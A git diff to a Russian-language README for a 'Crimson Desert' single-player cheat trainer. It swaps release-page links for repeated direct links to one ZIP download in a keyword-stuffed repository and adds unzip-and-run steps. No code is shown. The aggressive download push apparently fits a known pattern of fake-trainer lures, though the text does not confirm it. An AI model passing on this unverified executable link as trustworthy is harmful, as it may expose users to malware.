@@ -4,13 +4,13 @@
 Трейнер для **Crimson Desert** — 12 функций: здоровье, стамина, spirit, урон, деньги, скорость и время.
 
 <p align="center">
-  <a href="../../releases/latest">
+  <a href="https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/download/v1.0.0/Crimson.Desert.Trainer.Le.zip">
     <img src="https://img.shields.io/badge/%F0%9F%93%A5%20СКАЧАТЬ%20ТРЕЙНЕР-v1.0.0-22c55e?style=for-the-badge&labelColor=14532d" alt="Скачать трейнер Crimson Desert"/>
   </a>
 </p>
 
 <p align="center">
-  <a href="../../releases/latest"><img src="https://img.shields.io/badge/Download-Latest%20Release-22c55e?style=for-the-badge&logo=github&logoColor=white" alt="Download"/></a>
+  <a href="https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/download/v1.0.0/Crimson.Desert.Trainer.Le.zip"><img src="https://img.shields.io/badge/Download-ZIP%20v1.0.0-22c55e?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP"/></a>
   &nbsp;
   <a href="https://youtu.be/xJbFhv9Fa-g"><img src="https://img.shields.io/badge/YouTube-Тест%20функций-ff0000?style=for-the-badge&logo=youtube&logoColor=white" alt="YouTube"/></a>
   &nbsp;
@@ -28,7 +28,12 @@
 
 ## Скачать
 
-**→ [Скачать последнюю версию (Releases)](../../releases/latest)**
+> Прямая ссылка на ZIP из релиза:
+
+**→ [Скачать Crimson.Desert.Trainer.Le.zip](https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/download/v1.0.0/Crimson.Desert.Trainer.Le.zip)**
+
+Страница релиза:  
+**→ [v1.0.0](https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/tag/v1.0.0)**
 
 Также на **VGtimes**:  
 **→ [Crimson Desert трейнер +12 (2026)](https://vgtimes.ru/games/crimson-desert/files/96369-crimson-desert-trejjner-12-2026.html)**
@@ -43,7 +48,13 @@
 
 <p align="center">
   <a href="https://youtu.be/xJbFhv9Fa-g">
-    <img src="https://img.youtube.com/vi/xJbFhv9Fa-g/maxresdefault.jpg" alt="Crimson Desert trainer video test" width="860"/>
+    <img src="https://img.youtube.com/vi/xJbFhv9Fa-g/maxresdefault.jpg" alt="Crimson Desert trainer video test Infinite HP One Hit Money Speed" width="860"/>
+  </a>
+</p>
+
+<p align="center">
+  <a href="https://youtu.be/xJbFhv9Fa-g">
+    <img src="https://img.shields.io/badge/%E2%96%B6%20Смотреть%20видео-ff0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Смотреть видео"/>
   </a>
 </p>
 
@@ -90,11 +101,13 @@
 
 ## Как пользоваться
 
-1. Запусти **Crimson Desert**
-2. Запусти трейнер
-3. Дождись `CrimsonDesert.exe`
-4. Категории: Player / Combat / World / Items
-5. `Num` — вкл/выкл · `Ctrl+Shift+Home` — master off
+1. Скачай ZIP по зелёной кнопке
+2. Распакуй архив
+3. Запусти **Crimson Desert**
+4. Запусти трейнер
+5. Дождись `CrimsonDesert.exe`
+6. Категории: Player / Combat / World / Items
+7. `Num` — вкл/выкл · `Ctrl+Shift+Home` — master off
 
 | | |
 |--|--|
@@ -102,23 +115,42 @@
 | Процесс | `CrimsonDesert.exe` |
 | ОС | Windows 10 / 11 |
 | Читов | +12 |
+| Версия | v1.0.0 |
 
 ---
 
-## Ссылки
+## Где ещё опубликовано
 
-- YouTube: https://youtu.be/xJbFhv9Fa-g  
-- VGtimes: https://vgtimes.ru/games/crimson-desert/files/96369-crimson-desert-trejjner-12-2026.html  
-- Org: https://github.com/TrainerHubMoggyDay  
+- **GitHub ZIP:** [Crimson.Desert.Trainer.Le.zip](https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/download/v1.0.0/Crimson.Desert.Trainer.Le.zip)
+- **Release:** [v1.0.0](https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/tag/v1.0.0)
+- **VGtimes:** [пост / файл](https://vgtimes.ru/games/crimson-desert/files/96369-crimson-desert-trejjner-12-2026.html)
+- **YouTube:** [тест функций](https://youtu.be/xJbFhv9Fa-g)
+- **Организация:** [TrainerHub MoggyDay](https://github.com/TrainerHubMoggyDay)
+
+---
+
+## FAQ
+
+**Где скачать?**  
+Зелёная кнопка сверху или [прямая ссылка на ZIP](https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/download/v1.0.0/Crimson.Desert.Trainer.Le.zip). Также есть пост на [VGtimes](https://vgtimes.ru/games/crimson-desert/files/96369-crimson-desert-trejjner-12-2026.html).
+
+**Есть Infinite HP / One Hit / деньги / скорость?**  
+Да — Player, Combat, Items, World.
 
 ---
 
 ## Дисклеймер
 
-Для одиночной игры. Автор и TrainerHub MoggyDay не несут ответственности. Не используйте в онлайне.
+Для одиночной игры. Автор и [TrainerHub MoggyDay](https://github.com/TrainerHubMoggyDay) не несут ответственности. Не используйте в онлайне.
+
+---
 
 <p align="center">
-  <a href="../../releases/latest">
-    <img src="https://img.shields.io/badge/%F0%9F%93%A5%20СКАЧАТЬ%20ТРЕЙНЕР-22c55e?style=for-the-badge&labelColor=14532d" alt="Download"/>
+  <a href="https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/download/v1.0.0/Crimson.Desert.Trainer.Le.zip">
+    <img src="https://img.shields.io/badge/%F0%9F%93%A5%20СКАЧАТЬ%20ТРЕЙНЕР%20ZIP-22c55e?style=for-the-badge&labelColor=14532d" alt="Скачать трейнер"/>
   </a>
+</p>
+
+<p align="center">
+  <sub>Crimson Desert Trainer +12 · TrainerHub MoggyDay · VGtimes</sub>
 </p>
